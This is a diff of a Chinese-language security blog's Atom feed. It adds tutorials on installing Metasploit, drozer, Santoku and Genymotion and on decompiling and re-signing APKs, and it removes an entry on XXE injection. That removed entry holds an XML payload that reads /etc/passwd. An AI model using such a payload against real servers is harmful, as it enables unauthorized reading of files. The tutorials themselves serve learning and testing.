@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-01-14T08:42:06.733Z</updated>
+  <updated>2020-01-14T09:49:03.335Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,170 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ubuntu安装Metasploit</title>
+    <link href="http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85Metasploit/"/>
+    <id>http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85Metasploit/</id>
+    <published>2020-01-14T09:42:30.000Z</published>
+    <updated>2020-01-14T09:49:03.335Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;1-安装metasploit&quot;&gt;&lt;a href=&quot;#1-安装metasploit&quot; class=&quot;headerlink&quot; title=&quot;1.安装metasploit&quot;&gt;&lt;/a&gt;1.安装metasploit&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
+chmod 755 msfinstall
+./msfinstall&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/xpt7gv8ybmoswz3i1tsag89v/20.png&quot; alt=&quot;20.png-35.5kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;2-安装postgresql&quot;&gt;&lt;a href=&quot;#2-安装postgresql&quot; class=&quot;headerlink&quot; title=&quot;2.安装postgresql&quot;&gt;&lt;/a&gt;2.安装postgresql&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;apt-get install postgresql&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/a340z7jkrefzxw0rpxxp3dem/21.png&quot; alt=&quot;21.png-22.6kB&quot;&gt;&lt;br&gt;配置用户名和密码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;su – postgres
+psql
+\password postgres&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/1es139oyf0sm5xfyljo1lfho/22.png&quot; alt=&quot;22.png-24kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;3-msf连接数据库&quot;&gt;&lt;a href=&quot;#3-msf连接数据库&quot; class=&quot;headerlink&quot; title=&quot;3.msf连接数据库&quot;&gt;&lt;/a&gt;3.msf连接数据库&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;msfconsole
+db_connect postgres:123456@127.0.0.1/msf
+db_status&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+      <category term="Linux系统" scheme="http://yoursite.com/categories/Linux%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux系统" scheme="http://yoursite.com/tags/Linux%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu安装JDK和Tomcat</title>
+    <link href="http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85JDK%E5%92%8CTomcat/"/>
+    <id>http://yoursite.com/2020/01/14/Ubuntu%E5%AE%89%E8%A3%85JDK%E5%92%8CTomcat/</id>
+    <published>2020-01-14T09:36:36.000Z</published>
+    <updated>2020-01-14T09:41:35.368Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;安装准备&quot;&gt;&lt;a href=&quot;#安装准备&quot; class=&quot;headerlink&quot; title=&quot;安装准备&quot;&gt;&lt;/a&gt;安装准备&lt;/h3&gt;&lt;p&gt;安装环境如下：&lt;br&gt;&lt;em&gt;Ubuntu版本：Ubuntu 16.04.3&lt;/em&gt;&lt;br&gt;&lt;em&gt;jdk版本：jdk-8u144-linux-x64&lt;/em&gt;&lt;br&gt;&lt;em&gt;tomcat版本：apache-tomcat-8.5.23&lt;/em&gt;&lt;br&gt;首先下载jdk和tomcat，下载页面如下：&lt;br&gt;JDK: &lt;a href=&quot;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html&lt;/a&gt;&lt;br&gt;Tomcat：&lt;a href=&quot;https://tomcat.apache.org/download-80.cgi&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://tomcat.apache.org/download-80.cgi&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;安装JDK&quot;&gt;&lt;a href=&quot;#安装JDK&quot; class=&quot;headerlink&quot; title=&quot;安装JDK&quot;&gt;&lt;/a&gt;安装JDK&lt;/h3&gt;&lt;p&gt;解压jdk压缩包：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tar xzvf jdk-8u144-linux-x64.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建安装目录并将解压的jdk文件夹移动到该目录：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo mkdir /usr/lib/jvm
+sudo mv jdk1.8.0_144/ /usr/lib/jvm&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置/etc/profile文件，在后面添加以下内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144  #修改为自己的安装目录
+export JRE_HOME=${JAVA_HOME}/jre  
+export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib  
+export PATH=${JAVA_HOME}/bin:$PATH&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后让配置生效：&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Linux系统" scheme="http://yoursite.com/categories/Linux%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux系统" scheme="http://yoursite.com/tags/Linux%E7%B3%BB%E7%BB%9F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Santoku安装部署</title>
+    <link href="http://yoursite.com/2020/01/14/Santoku%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/"/>
+    <id>http://yoursite.com/2020/01/14/Santoku%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2/</id>
+    <published>2020-01-14T09:31:21.000Z</published>
+    <updated>2020-01-14T09:34:10.515Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;如果说Web安全爱好者居家旅行必备的利器是Kali Linux的话，那移动安全爱好者必备的利器应该就是Santoku了。Santoku是基于Ubuntu的移动安全分析平台，致力于手机恶意代码分析，内置安装AndroGuard工具包。&lt;br&gt;Santoku的官方下载地址是&lt;a href=&quot;https://santoku-linux.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://santoku-linux.com/&lt;/a&gt;，当前版本是0.5。&lt;/p&gt;
+&lt;h3 id=&quot;安装Santoku&quot;&gt;&lt;a href=&quot;#安装Santoku&quot; class=&quot;headerlink&quot; title=&quot;安装Santoku&quot;&gt;&lt;/a&gt;安装Santoku&lt;/h3&gt;&lt;p&gt;下面演示如何使用VMware安装Santoku。基本上是和Ubuntu一样的安装方法，创建虚拟机后，启动界面如下所示：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/r7x6v2vdxvah3piw81de294x/31.png&quot; alt=&quot;31.png-413.6kB&quot;&gt;&lt;br&gt;选择“live – boot the Live System”进入Live CD模式，这种模式下不需要安装就可以正常使用系统，缺点是无法保存文件。如果需要安装的话，可以在这个界面下选择“install – start the installer directly”，当然也可以在Live CD模式下选择“Install Santoku 14.04”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/cps4k75fq0an2l1ei46mpa6u/32.png&quot; alt=&quot;32.png-615.8kB&quot;&gt;&lt;br&gt;启动安装程序，选择“中文（简体）”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/ttgnizxm3m72cq9yqr3a3qu3/33.png&quot; alt=&quot;33.png-84.1kB&quot;&gt;&lt;br&gt;  选择硬盘分区方式，如果你对Linux分区不熟悉，就选择第一项“清除整个磁盘并安装Santoku”，我通常喜欢自己定义分区：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/nc1fv4sngm8fhh296inpqc4b/34.png&quot; alt=&quot;34.png-115.8kB&quot;&gt;&lt;br&gt;创建用户和密码：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/kwk1ns1j03ey87wouuia39sk/35.png&quot; alt=&quot;35.png-77.2kB&quot;&gt;&lt;br&gt;之后便进入了安装阶段，喝杯茶坐等安装完成吧：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/q5n7neyt6kfr0o5ku6w0j3jb/36.png&quot; alt=&quot;36.png-602.7kB&quot;&gt;&lt;br&gt;安装完成后重启Santoku，启动完成后如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/dec8i42lakpuwqn92l90sdm5/37.png&quot; alt=&quot;37.png-574.5kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;修改更新源&quot;&gt;&lt;a href=&quot;#修改更新源&quot; class=&quot;headerlink&quot; title=&quot;修改更新源&quot;&gt;&lt;/a&gt;修改更新源&lt;/h3&gt;&lt;p&gt;我们修改更新源，将它指向aliyun的源，这样可以极大地提高更新速度。打开菜单，选择“Preferences”-“Sofeware &amp;amp; Updates”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/v5tomo6ro8v3gw31az14qywa/38.png&quot; alt=&quot;38.png-492.8kB&quot;&gt;&lt;br&gt;在“Download from”中选择Other，找到“China”下的“mirrors.aliyun.com”:&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/nilmgn2l5ji5w50fcse4mm6d/39.png&quot; alt=&quot;39.png-314.1kB&quot;&gt;&lt;br&gt;关闭时选择”Reload”更新缓存：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/4tpix15apxct5zheqf808i8t/40.png&quot; alt=&quot;40.png-320.8kB&quot;&gt; &lt;/p&gt;
+&lt;h3 id=&quot;更改语言为中文&quot;&gt;&lt;a href=&quot;#更改语言为中文&quot; class=&quot;headerlink&quot; title=&quot;更改语言为中文&quot;&gt;&lt;/a&gt;更改语言为中文&lt;/h3&gt;&lt;p&gt;选择“Preferences”-“Language Support”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/cekyj6cidk34itz0ijo534x2/41.png&quot; alt=&quot;41.png-493.2kB&quot;&gt;&lt;br&gt;选择“Install”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/qb79mtvj5kb8y3obcd1ajkdz/42.png&quot; alt=&quot;42.png-340.8kB&quot;&gt;&lt;br&gt;安装完成后将“汉语”拖动到语言选项的最上方：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/7qsxlhx9l49s0dfpbxq3wih2/43.png&quot; alt=&quot;43.png-373.8kB&quot;&gt;&lt;br&gt;重启系统之后就变成中文了：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/dfintm29aknfbg5131oj7pjo/44.png&quot; alt=&quot;44.png-493.2kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;系统更新&quot;&gt;&lt;a href=&quot;#系统更新&quot; class=&quot;headerlink&quot; title=&quot;系统更新&quot;&gt;&lt;/a&gt;系统更新&lt;/h3&gt;&lt;p&gt;选择“系统工具”-“软件更新器”，或者在终端下使用“sudo apt-get upgrade”指令更新系统：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/upijulkg4lb8970fk3tka3q7/45.png&quot; alt=&quot;45.png-511.6kB&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/295t2x33wtv1u6n1qpovtf3k/46.png&quot; alt=&quot;46.png-357.7kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;安装VMware-Tools&quot;&gt;&lt;a href=&quot;#安装VMware-Tools&quot; class=&quot;headerlink&quot; title=&quot;安装VMware Tools&quot;&gt;&lt;/a&gt;安装VMware Tools&lt;/h3&gt;
+    
+    </summary>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>drozer安装和使用</title>
+    <link href="http://yoursite.com/2020/01/14/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yoursite.com/2020/01/14/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</id>
+    <published>2020-01-14T08:57:21.000Z</published>
+    <updated>2020-01-14T09:03:31.628Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Drozer是一款非常不错的Android APP安全评估工具，下面介绍如何安装和使用它。&lt;/p&gt;
+&lt;h3 id=&quot;Drozer下载&quot;&gt;&lt;a href=&quot;#Drozer下载&quot; class=&quot;headerlink&quot; title=&quot;Drozer下载&quot;&gt;&lt;/a&gt;Drozer下载&lt;/h3&gt;&lt;p&gt;Drozer的下载地址是&lt;a href=&quot;https://labs.mwrinfosecurity.com/tools/drozer/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://labs.mwrinfosecurity.com/tools/drozer/&lt;/a&gt;，需要下载PC端和手机agent.apk，我下载的是Windows版本：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/u358atlwiulm2wu6h2tqhjjf/1.png&quot; alt=&quot;1.png-114.3kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Drozer安装&quot;&gt;&lt;a href=&quot;#Drozer安装&quot; class=&quot;headerlink&quot; title=&quot;Drozer安装&quot;&gt;&lt;/a&gt;Drozer安装&lt;/h3&gt;&lt;p&gt;在PC上安装Drozer：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/z3cbsnx1x7n5qxaho8qlx8ke/2.png&quot; alt=&quot;2.png-42.6kB&quot;&gt;&lt;br&gt;   在手机或者Android模拟器上安装Drozer，我这里在夜神Android模拟器上安装：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/lhx5kyccsu9iragsud5laqj6/3.png&quot; alt=&quot;3.png-921.7kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Drozer连接&quot;&gt;&lt;a href=&quot;#Drozer连接&quot; class=&quot;headerlink&quot; title=&quot;Drozer连接&quot;&gt;&lt;/a&gt;Drozer连接&lt;/h3&gt;&lt;p&gt;在Windows命令提示符窗口中输入“Drozer”查看使用方法：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/i2hrtnyc6qiy2ou6q9eep3o9/4.png&quot; alt=&quot;4.png-24.2kB&quot;&gt;&lt;/p&gt;
+&lt;p&gt;console            运行Drozer命令行窗口&lt;br&gt;module　　　管理Drozer组件&lt;br&gt;server    　　　运行Drozer服务器&lt;br&gt;ssl　　　　　　管理Drozer SSL密钥&lt;br&gt;exploit            　生成可以在Drozer中使用的攻击代码&lt;br&gt;agent            　生成用户定义的Drozer agent&lt;br&gt;payload            生成可以在Drozer中使用的Payload&lt;/p&gt;
+&lt;p&gt;在模拟器中运行Drozer：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/rsz8f55iktf34ar9gi2w9acz/5.png&quot; alt=&quot;5.png-47.3kB&quot;&gt;&lt;br&gt;可以看到端口为31415，单击“Embedded Server”，可以看到运行状态：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/b33hwxccnd8yda1ofcr3xcsy/6.png&quot; alt=&quot;6.png-91.1kB&quot;&gt;&lt;br&gt;首先PC端要连接Android模拟器：&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/69l70t5rlpmacjdpuddk04mu/7.png&quot; alt=&quot;7.png-5.4kB&quot;&gt;&lt;br&gt;62001是夜神模拟器的端口，其他的模拟器请替换成相应的端口。&lt;br&gt;接着连接Drozer端口：&lt;/p&gt;
+&lt;p&gt;adb forward tcp:31415 tcp:31415&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>deepin安装Android模拟器Genymotion</title>
+    <link href="http://yoursite.com/2020/01/14/deepin%E5%AE%89%E8%A3%85Android%E6%A8%A1%E6%8B%9F%E5%99%A8Genymotion/"/>
+    <id>http://yoursite.com/2020/01/14/deepin%E5%AE%89%E8%A3%85Android%E6%A8%A1%E6%8B%9F%E5%99%A8Genymotion/</id>
+    <published>2020-01-14T08:51:03.000Z</published>
+    <updated>2020-01-14T08:56:41.116Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Genymotion是一个跨平台的Android模拟器，支持Windows、Mac和Linux，基于x86架构，可以将Eclipse和Androidstudio完美整合到开发环境中。&lt;br&gt;下面介绍如何在deepin中安装和使用Genymotion。&lt;/p&gt;
+&lt;h3 id=&quot;Genymotion下载&quot;&gt;&lt;a href=&quot;#Genymotion下载&quot; class=&quot;headerlink&quot; title=&quot;Genymotion下载&quot;&gt;&lt;/a&gt;Genymotion下载&lt;/h3&gt;&lt;p&gt;Genymotion的中文官网是&lt;a href=&quot;http://www.genymotion.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.genymotion.net/&lt;/a&gt;，这个网站除了介绍Genymotion的特性之外并没有什么用，我们首先要注册账号：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/vq859rh2x5n3n699swlvccvb/1.png&quot; alt=&quot;1.png-161.3kB&quot;&gt;&lt;br&gt;正式的官网是&lt;a href=&quot;https://www.genymotion.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.genymotion.com/&lt;/a&gt;：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/1rdk3hga7scgl8hr043ce28b/2.png&quot; alt=&quot;2.png-66.3kB&quot;&gt;   注册成功后登录官网，下载的页面是：&lt;a href=&quot;https://www.genymotion.com/download/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.genymotion.com/download/&lt;/a&gt;&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/t2dbrr05xvsnv126u2fcfgy4/3.png&quot; alt=&quot;3.png-88.7kB&quot;&gt;&lt;br&gt;除了在官网下载，还可以在deepin的深度商店上下载安装，但是在官网注册的步骤不能省略，后面配置需要登录。打开深度商店，找到“编程开发”，如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/b8294uqpt03j5qjm848e1luk/4.png&quot; alt=&quot;4.png-118.7kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Genymotion安装&quot;&gt;&lt;a href=&quot;#Genymotion安装&quot; class=&quot;headerlink&quot; title=&quot;Genymotion安装&quot;&gt;&lt;/a&gt;Genymotion安装&lt;/h3&gt;&lt;p&gt;安装如下：&lt;/p&gt;
+&lt;p&gt;chmod 755 genymotion-2.11.0-linux_x64.bin&lt;br&gt;sudo mv genymotion-2.11.0-linux_x64.bin /opt&lt;br&gt;cd /opt&lt;br&gt;sudo ./genymotion-2.11.0-linux_x64.bin&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/x3c0zmpgy1faj0kxpcedpgj7/5.png&quot; alt=&quot;5.png-85.2kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;配置Genymotion&quot;&gt;&lt;a href=&quot;#配置Genymotion&quot; class=&quot;headerlink&quot; title=&quot;配置Genymotion&quot;&gt;&lt;/a&gt;配置Genymotion&lt;/h3&gt;&lt;p&gt;启动Genymotin如下：&lt;/p&gt;
+&lt;p&gt;cd genymobile/genymotion/&lt;br&gt;./genymotion&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>apk反编译</title>
+    <link href="http://yoursite.com/2020/01/14/apk%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
+    <id>http://yoursite.com/2020/01/14/apk%E5%8F%8D%E7%BC%96%E8%AF%91/</id>
+    <published>2020-01-14T08:44:35.000Z</published>
+    <updated>2020-01-14T08:48:05.672Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;dex2jar获得jar代码文件&quot;&gt;&lt;a href=&quot;#dex2jar获得jar代码文件&quot; class=&quot;headerlink&quot; title=&quot;dex2jar获得jar代码文件&quot;&gt;&lt;/a&gt;dex2jar获得jar代码文件&lt;/h3&gt;&lt;p&gt;&lt;font color=&quot;red&quot;&gt;dex2jar.bat apk文件&lt;/font&gt;&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/o1gup1xjq01jfbr417rfsa11/21.png&quot; alt=&quot;21.png-14.8kB&quot;&gt;&lt;br&gt;也可以直接将apk文件拖放到dex2jar.bat上。&lt;br&gt;或者使用第二种办法，将apk当成zip解压，得到如下文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/yk3agefhovuwpgsz3tlggxi4/22.png&quot; alt=&quot;22.png-102.3kB&quot;&gt;&lt;br&gt;用dex2jar.bat将classes.dex进行转换：&lt;br&gt;&lt;font color=&quot;red&quot;&gt;dex2jar.bat classes.dex&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/d547u96kpytwg15oqgxxk7ik/23.png&quot; alt=&quot;23.png-15.5kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;jd-gui读取jar文件&quot;&gt;&lt;a href=&quot;#jd-gui读取jar文件&quot; class=&quot;headerlink&quot; title=&quot;jd-gui读取jar文件&quot;&gt;&lt;/a&gt;jd-gui读取jar文件&lt;/h3&gt;&lt;p&gt;使用jd-gui来读取jar文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/vg9yu48p2stbuld8o64xxb87/24.png&quot; alt=&quot;24.png-54kB&quot;&gt;&lt;br&gt;选择File-Save All Sources保存成zip压缩包，便可将其还原成java文件。&lt;/p&gt;
+&lt;h3 id=&quot;apktool调试apk文件&quot;&gt;&lt;a href=&quot;#apktool调试apk文件&quot; class=&quot;headerlink&quot; title=&quot;apktool调试apk文件&quot;&gt;&lt;/a&gt;apktool调试apk文件&lt;/h3&gt;&lt;p&gt;解包apk文件：&lt;br&gt;&lt;font color=&quot;red&quot;&gt;java –jar apktool.jar d –f apk 源文件路径 –o 目标文件路径&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/685xgu9q9wop6yxvchy61csn/25.png&quot; alt=&quot;25.png-32.2kB&quot;&gt;&lt;br&gt;重新打包apk文件：&lt;br&gt;&lt;font color=&quot;red&quot;&gt;java –jar apktool.jar b –f 源目录 –o 目标apk文件路径&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tsv18h52jtnmc19huu0gry5w/26.png&quot; alt=&quot;26.png-15.5kB&quot;&gt;&lt;br&gt;解包后的apk可以直接查看smali文件：&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/x4y7m3lwypsgzzg7v16kxsna/27.png&quot; alt=&quot;27.png-65.6kB&quot;&gt;&lt;br&gt;也可以直接读取AndroidManifest.xml的内容：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/4ahpofcl8564wsiqttrax8tn/28.png&quot; alt=&quot;28.png-47.4kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;keytool生成证书文件&quot;&gt;&lt;a href=&quot;#keytool生成证书文件&quot; class=&quot;headerlink&quot; title=&quot;keytool生成证书文件&quot;&gt;&lt;/a&gt;keytool生成证书文件&lt;/h3&gt;&lt;p&gt;keytool生成证书文件：&lt;br&gt;&lt;font color=&quot;red&quot;&gt;keytool -genkey -v -keystore my_key.Keystore -alias android_key -keyalg RSA -keysize 2048 -validity 9999&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/hxmpkqeu4jviu27ad84s7ehh/1.png&quot; alt=&quot;1.png-277.7kB&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;jarsigner对apk文件签名&quot;&gt;&lt;a href=&quot;#jarsigner对apk文件签名&quot; class=&quot;headerlink&quot; title=&quot;jarsigner对apk文件签名&quot;&gt;&lt;/a&gt;jarsigner对apk文件签名&lt;/h3&gt;&lt;p&gt;&lt;font color=&quot;red&quot;&gt;jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my_key.Keystore test.apk android_key&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/2llhfls0uqeb8ds0rzjkaxpu/2.png&quot; alt=&quot;2.png-139kB&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://yoursite.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>heredoc和nowdoc</title>
@@ -523,234 +687,6 @@ CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代�
     
     
       <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XXE注入</title>
-    <link href="http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-01-14T03:05:43.000Z</published>
-    <updated>2020-01-14T03:32:05.560Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;XXE注入攻击简介&quot;&gt;&lt;a href=&quot;#XXE注入攻击简介&quot; class=&quot;headerlink&quot; title=&quot;XXE注入攻击简介&quot;&gt;&lt;/a&gt;XXE注入攻击简介&lt;/h3&gt;&lt;p&gt;XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。&lt;br&gt;在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。&lt;br&gt;当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。&lt;/p&gt;
-&lt;h3 id=&quot;XXE注入利用&quot;&gt;&lt;a href=&quot;#XXE注入利用&quot; class=&quot;headerlink&quot; title=&quot;XXE注入利用&quot;&gt;&lt;/a&gt;XXE注入利用&lt;/h3&gt;&lt;p&gt;首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。&lt;/p&gt;
-&lt;h4 id=&quot;简单检测&quot;&gt;&lt;a href=&quot;#简单检测&quot; class=&quot;headerlink&quot; title=&quot;简单检测&quot;&gt;&lt;/a&gt;简单检测&lt;/h4&gt;&lt;p&gt;Payload如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
-&amp;lt;!DOCTYPE any[
-&amp;lt;!ENTITY test &amp;quot;this is a test&amp;quot;&amp;gt;
-]&amp;gt;
-&amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h4&gt;&lt;p&gt;Payload如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;  
-&amp;lt;!DOCTYPE ANY [  
-&amp;lt;!ENTITY test SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;  
-]&amp;gt; 
-&amp;lt;root&amp;gt;&amp;amp;test;&amp;lt;/root&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-    
-    </summary>
-    
-    
-      <category term="XXE注入" scheme="http://yoursite.com/categories/XXE%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="XXE注入" scheme="http://yoursite.com/tags/XXE%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
